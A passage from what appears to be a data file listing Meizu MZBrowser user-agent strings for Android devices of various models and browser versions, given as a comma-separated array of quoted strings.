(KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.2.110-2018082915 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m3 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.9.110-2019060317 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-meizu note9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U20 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-MEIZU M6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3E Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-PRO 7 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1.1; zh-CN; MZ-MX4 Pro Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu note8 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU_M5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5c Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; MZ-MX6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-Meizu M6s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m3 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-M3s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U20 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3E Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-meizu 16Xs Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-MX4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-M1852 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.11.6 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MX6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-meizu note9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu X8 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U10 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu M8 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m1 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3 Max Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-PRO 7 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.12.1 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-MEIZU M6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M6T Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-15 Lite Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-PRO 7 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.12.1 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16th Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-MEIZU M6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.12.1 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-16s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; MZ-15 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-202006MZ-1519 UWS/2.MZ-15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1.1; zh-CN; MZ-MX4 Pro Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.7.110-2019010410 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0.1; zh-CN; MZ-PRO 6 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0.0; zh-CN; MZ-PRO 6 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-PRO 5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.13.110-2019112819 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.12.1 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.12.110-2019110416 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu note8 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.2.120-2018102909 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-Meizu M8c Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-PRO 7 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M685U Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.9.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0.0; zh-CN; MZ-PRO 6 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.13.1 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-M3s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.2.1 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.14.1 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m3 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu note8 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-PRO 5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-M3s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-Meizu M6s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3E Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5c Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU_M5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-PRO 7 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-Meizu M8c Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu M8 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu X8 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3 Max Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; MZ-MX6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 10; zh-CN; MZ-meizu 17 Pro Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.15.1 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-M1852 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.15.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16th Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-PRO 7 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U10 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M6T Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M611D Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.15.1 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu M8 lite Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-16T Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.5.1 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-meizu note9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-MEIZU M6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0.0; zh-CN; MZ-PRO 6 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U20 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.8.5 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.7.110-2019010410 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; MZ-MEIZU E3 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.0.6 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.16.1 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1.1; zh-CN; MZ-MX4 Pro Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.9.0 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-15 Lite Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16 X Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.16.1 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.16.1 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16th Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.15.1 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-meizu 16Xs Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0.1; zh-CN; MZ-PRO 6 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-15 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36",
